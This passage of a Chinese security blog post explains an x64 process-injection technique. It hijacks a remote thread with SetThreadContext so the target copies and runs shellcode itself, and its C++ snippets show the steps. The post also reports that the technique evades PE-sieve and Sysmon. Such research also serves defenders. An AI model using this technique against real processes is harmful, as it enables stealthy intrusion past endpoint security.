class="number">0</span>; i -= <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T)) &#123;</span><br><span class="line">    ULONG_PTR* StackVal = (ULONG_PTR*)((LPBYTE)Stack + i);</span><br><span class="line">    <span class="keyword">if</span> (*StackVal == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Get stack offset.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        *StackOffset = i + <span class="number">5</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果可执行文件的模块内没有 RW 页面，则可以执行后备操作以写入堆栈。 要查找远程进程的堆栈，我们可以执行以下操作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NtQueryInformationThread</span>(</span><br><span class="line">    ThreadHandle,</span><br><span class="line">    ThreadBasicInformation,</span><br><span class="line">    &amp;ThreadBasicInfo,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(THREAD_BASIC_INFORMATION),</span><br><span class="line">    &amp;ReturnLength</span><br><span class="line">);</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ThreadBasicInfo.TebBaseAddress,</span><br><span class="line">    &amp;Tib,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(NT_TIB),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get stack offset.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>Tib 中的结果将包含堆栈范围地址。 有了这些值，我们可以在使用代码之前从堆栈底部开始定位适当的偏移量。</p><h3 id="写入-ShellCode"><a href="#写入-ShellCode" class="headerlink" title="写入 ShellCode"></a>写入 ShellCode</h3><p>No Allocation 的主要问题是我们必须编写 ShellCode，然后在同一页面中执行它。 有一种方法可以不使用 VirtualProtectEx 或具有此特殊功能的复杂 ROP 链：WriteProcessMemory。 好的，我确实说过我们不能使用 WriteProcessMemory 将数据从我们的进程写入目标，但是我没有说我们不能强迫目标进程自己使用它。WriteProcessMemory 内部的隐藏机制之一是，它将相应地重新保护目标缓冲区的页面以执行写操作。 在这里，我们看到使用 NtQueryVirtualMemory 查询目标缓冲区的页面：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/8AB2CE60AFE4B834E457A8949860FF1E.png" alt=""></p><p>然后使用 NtProtectVirtualMemory 对页面进行写保护：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/B029BE46925D6AE3531CE2FED28FC700.png" alt=""></p><p>如果您已经注意到，WriteProcessMemory 会在函数开始时修改 shadow 堆栈。 在这种情况下，我们需要修改 ShellCode 以填充 shadow 堆栈：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BYTE Shellcode[] = &#123;</span><br><span class="line">    <span class="comment">// Placeholder for ret from ReadProcessMemory to infinte jmp loop.</span></span><br><span class="line">    <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="comment">// Pad for shadow stack.</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Shellcode starts here at Shellcode + 0x30...</span></span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0xFE</span>, <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x89</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCC</span>, <span class="number">0xDD</span>, <span class="number">0xEE</span>, <span class="number">0xFF</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在我们需要依次调用 ReadProcessMemory 和 WriteProcessMemory。 回到 ReadProcessMemory 的返回中，我们可以简单地跳回到无限 jmp 循环小工具以暂停执行，而不是停止执行 ShellCode（现在位于不可执行的页面）：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/0F7ADBEDB8FC310D3D736DE63C7DF705.png" alt=""></p><p>这使得恶意进程有时间调用另一个 SetThreadContext 将 RIP 设置为 WriteProcessMemory 并重用 ReadProcessMemory 中的 RSP。 我们可以从 ReadProcessMemory 复制的同一位置读取 ShellCode（将 0x30 字节复制到实际的 ShellCode），然后将具有执行许可权的任何页面作为目标（同样，假设有 RX 节）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get target process to write the shellcode</span></span><br><span class="line">Success = <span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    &amp;ThreadHandle,</span><br><span class="line">    <span class="comment">// Set rip to read our shellcode</span></span><br><span class="line">    &amp;_WriteProcessMemory,</span><br><span class="line">    <span class="comment">// RSP points to same stack offset</span></span><br><span class="line">    &amp;StackLocation,</span><br><span class="line">    <span class="comment">// RCX: Target process&#x27; own handle</span></span><br><span class="line">    (HANDLE)<span class="number">-1</span>,</span><br><span class="line">    <span class="comment">// RDX: Buffer to store shellcode</span></span><br><span class="line">    ShellcodeLocation,</span><br><span class="line">    <span class="comment">// R8: Address to write from</span></span><br><span class="line">    (LPBYTE)StackLocation + <span class="number">0x30</span>,</span><br><span class="line">    <span class="comment">// R9: size to write</span></span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode) - <span class="number">0x30</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>当 WriteProcessMemory 返回时，它应再次返回到无限 jmp 循环，从而允许恶意进程对 SetThreadContext 进行最终调用以执行 ShellCode：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Execute the shellcodez</span></span><br><span class="line">Success = <span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    &amp;ThreadHandle,</span><br><span class="line">    <span class="comment">// Set RIP to execute shellcode</span></span><br><span class="line">    &amp;ShellcodeLocation,</span><br><span class="line">    <span class="comment">// RSP is optional</span></span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="comment">// Arguments to shellcode are optional</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>总体而言，整个注入过程如下：</p><ol><li>将 SetThreadContext 设置为无限的 jmp 循环，以允许 SetThreadContext 可靠地使用易失性寄存器；</li><li>找到一个有效的 RW 堆栈（或伪堆栈）以承载 ReadProcessMemory 和 WriteProcessMemory 参数以及临时的 ShellCode；</li><li>使用 DuplicateHandle 为目标进程注册一个重复的句柄，以从恶意进程中读取 ShellCode；</li><li>使用 SetThreadContext 调用 ReadProcessMemory 复制 ShellCode；</li><li>在 ReadProcessMemory 之后返回无限 jmp 循环；</li><li>使用 SetThreadContext 调用 WriteProcessMemory 将 ShellCode 复制到 RX 页面；</li><li>在 WriteProcessMemory 之后返回无限 jmp 循环；</li><li>使用 SetThreadContext 调用 ShellCode；</li></ol><h2 id="关于检测"><a href="#关于检测" class="headerlink" title="关于检测"></a>关于检测</h2><p>为了快速测试隐蔽性能，我使用了两个工具：hasherazade 的 PE-sieve 和 Sysinternal 的 Sysmon。 如果还有其他防御性监视工具，我很想看看这种技术与它们对抗的能力。</p><h3 id="PE-sieve"><a href="#PE-sieve" class="headerlink" title="PE-sieve"></a>PE-sieve</h3><p>我在玩 PE-sieve 时注意到的一点是，如果我们将 ShellCode 注入到 .text（或其他相关部分）的填充中，则根本不会检测到它：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/FC5498FEF7E65DEFE01AAA575815E383.png" alt=""></p><p>如果 ShellCode 太大而无法填充，则另一个模块可能包含更大的空间。</p><h3 id="Sysmon-事件"><a href="#Sysmon-事件" class="headerlink" title="Sysmon 事件"></a>Sysmon 事件</h3><p>这些是使用 CreateProcess 调用而不是 OpenProcess 生成目标进程的预期结果。其他需要注意的是，DuplicateHandle 调用可能会触发 Sysmon 中 ObRegisterCallbacks 的进程句柄事件。并非如此，因为如果拥有相同句柄的进程执行了句柄访问，则 Sysmon 不会跟随该事件。 对于 AV 或 EDR，可能有所不同。</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/CE95F26A8415571143CB56743893016F.png" alt=""></p><h3 id="进一步改进"><a href="#进一步改进" class="headerlink" title="进一步改进"></a>进一步改进</h3><p>自从我真正着手完成这个（副项目）项目以来，我不会怀疑可能会忽略一些问题 – 我只需要探索这个想法，看看我能走多远。 关于恢复被劫持线程的执行，有可能并且我已经在 PoC 中实现了它，但是它取决于恶意进程，这可能是好事，也可能不是好事。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>因此，有可能不使用恶意进程中的 WriteProcessMemory，VirtualAllocEx，VirtualProtectEx，CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread 来注入远程进程。 OpenProcess 和 OpenThread 的用法仍然值得商榷，因为有时使用 CreateProcess 生成目标进程并不总是这种情况。但是，它确实消除了许多可疑 call，这是此技术的目标。</p><p>由于 SetThreadContext 是一个如此强大的原始函数，并且对该函数和其他许多隐秘技术至关重要，因此是否会对此进行更多关注？ 从我所看到的，Microsoft-Windows-Kernel-Audit-API-Calls ETW 提供程序中已经有可用的本机 Windows 日志记录。 我有兴趣了解进程注入的未来 …</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者:</span> <span class="post-copyright-info"><a href="mailto:undefined">zeronohacker</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接:</span> <span class="post-copyright-info"><a href="https://zeronohacker.github.io/2020/06/05/nina-x64-process-injection/">https://zeronohacker.github.io/2020/06/05/nina-x64-process-injection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zeronohacker.github.io" target="_blank">zeronohacker</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/NINA/">NINA</a><a class="post-meta__tags" href="/tags/Inject/">Inject</a></div><div class="post_share"><div class="social-share" data-image="https://image.zeronohacker.com/top_img/2020/06/05/hacker-injecting-code.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/31/maldoc-uses-windows-api-to-perform-process-hollowing/"><img class="prev-cover" src="https://image.zeronohacker.com/top_img/2020/08/31/securityrisks1.jpg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">恶意文档使用 Windows API 进行 Process hollowing</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/31/make-yara-syntax-highlighting-in-notepad-plus-plus/"><img class="next-cover" src="https://image.zeronohacker.com/top_img/2020/05/31/116-11_800x.png" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Notepad++ 中让 Yara 语法高亮</div></div></a></div></nav><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://image.zeronohacker.com/header.png" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__name">zeronohacker</div><div class="author-info__description">There is no absolutely safe system in the world!</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zeronohacker"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://twitter.com/zeronohacker" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a><a class="social-icon" href="mailto:zeronohacker@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://zeronohacker.github.io/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">前述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0-No-Injection"><span class="toc-number">2.</span> <span class="toc-text">实现 No Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CreateProcess"><span class="toc-number">2.1.</span> <span class="toc-text">CreateProcess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualAllocEx"><span class="toc-number">2.2.</span> <span class="toc-text">VirtualAllocEx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReadProcessMemory"><span class="toc-number">2.3.</span> <span class="toc-text">ReadProcessMemory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SetThreadContext"><span class="toc-number">2.4.</span> <span class="toc-text">SetThreadContext</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%EF%BC%9ANo-Allocation"><span class="toc-number">3.</span> <span class="toc-text">实现：No Allocation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E6%A0%88"><span class="toc-number">3.1.</span> <span class="toc-text">堆栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5-ShellCode"><span class="toc-number">3.2.</span> <span class="toc-text">写入 ShellCode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">关于检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PE-sieve"><span class="toc-number">4.1.</span> <span class="toc-text">PE-sieve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sysmon-%E4%BA%8B%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">Sysmon 事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%94%B9%E8%BF%9B"><span class="toc-number">4.3.</span> <span class="toc-text">进一步改进</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">5.</span> <span class="toc-text">结论</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/21/template-driven-av-and-edr-evasion-framework/" title="以模板驱动的逃避 AV/EDR 框架"><img src="https://image.zeronohacker.com/top_img/2021/09/21/inceptor-logo.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="以模板驱动的逃避 AV/EDR 框架"></a><div class="content"><a class="title" href="/2021/09/21/template-driven-av-and-edr-evasion-framework/" title="以模板驱动的逃避 AV/EDR 框架">以模板驱动的逃避 AV/EDR 框架</a><time datetime="2021-09-21T09:44:22.000Z" title="发表于 2021-09-21 17:44:22">2021-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/13/wmi-registry-part-3/" title="WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)"><img src="https://image.zeronohacker.com/top_img/2021/09/13/cover.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)"></a><div class="content"><a class="title" href="/2021/09/13/wmi-registry-part-3/" title="WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)">WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)</a><time datetime="2021-09-13T14:46:41.000Z" title="发表于 2021-09-13 22:46:41">2021-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/07/wmi-classes-methods-part-2/" title="WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)"><img src="https://image.zeronohacker.com/top_img/2021/09/07/cover.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)"></a><div class="content"><a class="title" href="/2021/09/07/wmi-classes-methods-part-2/" title="WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)">WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)</a><time datetime="2021-09-07T14:35:33.000Z" title="发表于 2021-09-07 22:35:33">2021-09-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/31/wmi-basics-part-1/" title="WMI 攻击手法研究 - 基础篇 (第一部分)"><img src="https://image.zeronohacker.com/top_img/2021/08/31/cover.png" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="WMI 攻击手法研究 - 基础篇 (第一部分)"></a><div class="content"><a class="title" href="/2021/08/31/wmi-basics-part-1/" title="WMI 攻击手法研究 - 基础篇 (第一部分)">WMI 攻击手法研究 - 基础篇 (第一部分)</a><time datetime="2021-08-31T14:25:57.000Z" title="发表于 2021-08-31 22:25:57">2021-08-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/30/decoding-malious-powershell-activity-a-case-study/" title="从一个恶意活动中学习 PowerShell 解码"><img src="https://image.zeronohacker.com/top_img/2021/03/30/4-0.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="从一个恶意活动中学习 PowerShell 解码"></a><div class="content"><a class="title" href="/2021/03/30/decoding-malious-powershell-activity-a-case-study/" title="从一个恶意活动中学习 PowerShell 解码">从一个恶意活动中学习 PowerShell 解码</a><time datetime="2021-03-30T13:50:59.000Z" title="发表于 2021-03-30 21:50:59">2021-03-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image:url(https://image.zeronohacker.com/top_img/2020/06/05/hacker-injecting-code.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By zeronohacker</div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="https://image.zeronohacker.com/icp.png"><span>赣ICP备20006890号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",preloader.endLoading())</script><div class="js-pjax"><script>function loadValine(){function e(){new Valine(Object.assign({el:"#vcomment",appId:"5zJhxW3eLTeGMw49HFsbee5P-gzGzoHsz",appKey:"GSf2czvdDct9w1M2UBwkGQ94",placeholder:"Please leave your footprints",avatar:"monsterid",meta:"nick,mail,link".split(","),pageSize:"10",lang:"zh-CN",recordIP:!1,serverURLs:"",emojiCDN:"",emojiMaps:"",enableQQ:!1,path:window.location.pathname,requiredFields:["nick,mail"],visitor:!1},null))}"function"==typeof Valine?e():getScript("https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js").then(e)}{function loadOtherComment(){loadValine()}setTimeout(loadValine,0)}</script></div><script defer id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script></body></html>